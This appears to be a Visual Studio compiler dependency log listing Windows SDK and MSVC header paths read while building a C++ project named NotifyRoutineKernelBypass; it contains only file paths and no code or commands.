C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINREG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REASON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNETWK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WNNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\CDERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDEML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DLGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LZEXPAND.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSTEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSCOM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCIAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PLAYSOUNDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOYSTICKAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NB30.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCDCEP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNTERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCASYNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SHELLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINPERF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSOCK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\INADDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NCRYPT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINEFS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSCARD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCNDR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\RPCNSIP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\RPCSAL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WTYPESBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINIOCTL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINSMCRD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSPOOL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PRSHT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLE2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDLIB.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MALLOC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SEARCH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDLIB.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWNBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CGUID.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COML2API.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OBJIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UNKNWN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDLBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OAIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\URLMON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SERVPROV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MSXML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROPIDL.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\OLEAUTO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\COMMDLG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\STRALIGN.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINSVC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCX.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IMM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IME_CMODES.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS_CORE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XKEYCHECK.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_SANITIZER_ANNOTATE_CONTAINER.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_STRING_VIEW.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\IOSFWD
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\YVALS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CRTDBG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW_DEBUG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_NEW.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CRTDEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\USE_ANSI.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDIO
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTDIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_STDIO_CONFIG.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTRING
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CWCHAR
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\WCHAR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCONIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WDIRECT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WIO.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_SHARE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WPROCESS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WTIME.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\STAT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\SYS\TYPES.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XTR1COMMON
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XUTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\__MSVC_ITER_CORE.HPP
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\UTILITY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INITIALIZER_LIST
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDDEF
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\TYPE_TRAITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDINT
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDINT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CLIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CSTDLIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MATH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MATH.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XMEMORY
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\LIMITS
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CFLOAT
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\FLOAT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\INTRIN0.INL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\NEW
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCEPTION
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\MALLOC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_EXCEPTION.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EH.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_TERMINATE.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\XATOMIC.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CCTYPE
C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\MEMHANDLER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACLAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ACCCTRL.H
^C:\GITHUB-VIXX\KERNEL-CALLBACK-REMOVAL\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS\NOTIFYROUTINEKERNELBYPASS.CPP
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINDOWS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINAPIFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINPACKAGEFAMILY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDKDDKVER.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\EXCPT.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\SAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\CONCURRENCYSAL.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VADEFS.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\STDARG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\MINWINDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_STRICT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SPECSTRINGS_UNDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\SDV_DRIVERSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WCTYPE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KERNELSPECS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\BASETSD.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\GUIDDEF.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMORY.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_MEMCPY_S.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\ERRNO.H
C:\PROGRAM FILES\MICROSOFT VISUAL STUDIO\2022\COMMUNITY\VC\TOOLS\MSVC\14.42.34433\INCLUDE\VCRUNTIME_STRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UCRT\CORECRT_WSTRING.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK4.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\POPPACK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK8.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\PSHPACK1.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\KTMTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\APISETCCONV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MINWINBASE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\APIQUERY2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSENV.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPIFROMAPP.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DEBUGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\UTILAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HANDLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ERRHANDLINGAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\FIBERSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMEDPIPEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROFILEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\HEAPAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\IOAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYNCHAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\INTERLOCKEDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTHREADSAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSINFOAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MEMORYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\ENCLAVEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLLEGACYAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\THREADPOOLAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOBAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WOW64APISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LIBLOADERAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYBASEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\NAMESPACEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SYSTEMTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PROCESSTOPOLOGYAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\SECURITYAPPCONTAINER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REALTIMEAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WINERROR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEZONEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINGDI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINUSER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\TVOUT.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNLS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DATETIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\STRINGAPISET.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINCONTYPES.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\CONSOLEAPI3.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINVER.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\VERRSRC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINREG.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\REASON.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\WINNETWK.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\WNNC.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\SHARED\CDERR.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDE.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DDEML.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\DLGS.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\LZEXPAND.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSTEM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMSYSCOM.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MCIAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMISCAPI2.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\PLAYSOUNDAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\MMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\TIMEAPI.H
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\INCLUDE\10.0.26100.0\UM\JOYSTICKAPI.H
